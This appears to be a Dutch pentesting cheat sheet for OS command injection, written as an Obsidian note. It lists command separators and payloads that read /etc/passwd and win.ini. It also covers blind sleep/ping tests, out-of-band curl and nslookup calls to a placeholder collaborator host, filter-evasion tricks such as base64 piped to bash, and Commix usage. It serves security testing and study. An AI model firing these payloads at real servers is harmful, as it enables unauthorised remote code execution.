
Dit is de absolute hoofdprijs (RCE). Als je dit vindt, neem je de server over. Het is vaak een **Critical** finding.

Hier is de complete Obsidian notitie voor **OS Command Injection**. Ik heb hem opgedeeld in **Detectie**, **Blind**, **Bypasses** en **Tools**.

Kopieer dit blok direct in je vault:

Markdown

````
# 🐚 OS Command Injection (RCE)

==Doel: Systeemcommando's uitvoeren op de server (host OS) via een lekke applicatie.==
*Impact: Volledige controle over de server.*



---

## 🗝️ 1. Command Separators (De Sleutel)
*Om je eigen commando uit te voeren, moet je eerst het "bedoelde" commando van de server afsluiten of onderbreken.*

Probeer deze tekens achter de input (bijv. `?ip=1.1.1.1[HIER]`):

| Teken | Naam | Werking | Linux | Windows |
| :--- | :--- | :--- | :--- | :--- |
| `;` | Semicolon | Einde commando, start nieuwe. | ✅ | ❌ |
| `&` | Ampersand | Start commando in achtergrond. | ✅ | ✅ |
| `&&` | AND | Voer uit als vorige succesvol was. | ✅ | ✅ |
| `|` | Pipe | Stuur output naar volgende. | ✅ | ✅ |
| `||` | OR | Voer uit als vorige faalt (forceer error!). | ✅ | ✅ |
| `\n` | Newline | `%0A` (URL encoded). | ✅ | ❌ |
| `` ` `` | Backticks | Command Substitution. | ✅ | ❌ |
| `$()` | Subshell | Command Substitution. | ✅ | ❌ |

---

## 🐧 2. Basic Payloads (Proof of Concept)
*Als je output ziet (niet blind), gebruik deze commando's om te bewijzen dat je RCE hebt.*

> [!INFO] Linux Targets
> ```bash
> ; whoami
> ; id
> ; cat /etc/passwd
> ; uname -a
> ; ls -la
> ```

> [!INFO] Windows Targets
> ```cmd
> & whoami
> & ver
> & ipconfig /all
> & type C:\Windows\win.ini
> & dir
> ```

---

## 🙈 3. Blind Injection (Time-Based & OOB)
*Als de server geen output teruggeeft, moet je hem laten "slapen" of laten "bellen".*

### Time-Based (Vertraging)
Als de pagina normaal in 0.5s laadt, en met deze payload in 10.5s, dan heb je RCE.

**Linux:**
```bash
; sleep 10
|| sleep 10
&& sleep 10
`sleep 10`
````

**Windows:** _(Windows heeft geen `sleep`, gebruik `timeout` of `ping`)_

DOS

```
& timeout /t 10
& ping -n 10 127.0.0.1
```

### Out-of-Band (OOB) - DNS/HTTP

Dwing de server om contact te maken met jouw server (Burp Collaborator / Interactsh).

Bash

```
; curl [http://jouw-collaborator.com](http://jouw-collaborator.com)
; wget [http://jouw-collaborator.com](http://jouw-collaborator.com)
; nslookup jouw-collaborator.com
; ping jouw-collaborator.com
```

---

## 🚧 4. Filter Bypasses (WAF Evasion)

_De server blokkeert spaties of woorden als `cat`? Gebruik deze trucs._

### Spaties Omzeilen (Space Bypass)

Als de spatie wordt geblokkeerd, gebruik dan een variabele of redirect.

**Linux:**

Bash

```
cat${IFS}/etc/passwd
cat< /etc/passwd
{cat,/etc/passwd}
X=$'cat\x20/etc/passwd'&&$X
```

**Windows:**

DOS

```
ping%20127.0.0.1
type%09win.ini
```

### Blacklist Omzeilen (Keyword Bypass)

Als het woord `cat` of `etc` geblokkeerd is.

**Concatenation (Aan elkaar plakken):**

Bash

```
# Linux
c'a't /etc/passwd
c\at /etc/passwd

# Windows
"w"ho"am"i
```

**Base64 Encoding (De beste methode):** _Encode je commando naar Base64 en laat de server het decoden en uitvoeren._

Bash

```
# Commando: cat /etc/passwd -> Y2F0IC9ldGMvcGFzc3dk
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash
```

---

## 🤖 5. Tools (Automation)

**Commix** (De "SQLmap" voor Command Injection) Zeer krachtig. Kan automatisch shells uploaden.

Bash

```
# Basis scan
commix --url="[http://target.com?ip=TEST](http://target.com?ip=TEST)" --batch

# Als je een request file uit Burp hebt
commix -r request.txt --batch
```

---

## 📝 Checklist Command Injection

- [ ] **OS Identification:** Weet ik of het Linux of Windows is? (Ping TTL check: Linux ~64, Windows ~128).
    
- [ ] **Separators:** Heb ik ze allemaal geprobeerd? `;` `|` `&` `%0A`.
    
- [ ] **Blind:** Heb ik time-delays geprobeerd (`sleep 10`)?
    
- [ ] **OOB:** Heb ik `curl` of `nslookup` naar mijn collaborator gestuurd?
    
- [ ] **Encoding:** Heb ik mijn payloads URL-encoded in Burp? (`Ctrl+U`).
    

```

### Extra Tip voor Burp Suite
Als je aan het testen bent in **Burp Repeater**, vergeet niet je payload te **URL-encoden**.
Een spatie moet `%20` zijn, een `&` moet `%26` zijn.
Selecteer je payload in Burp en druk op `Ctrl + U`.
```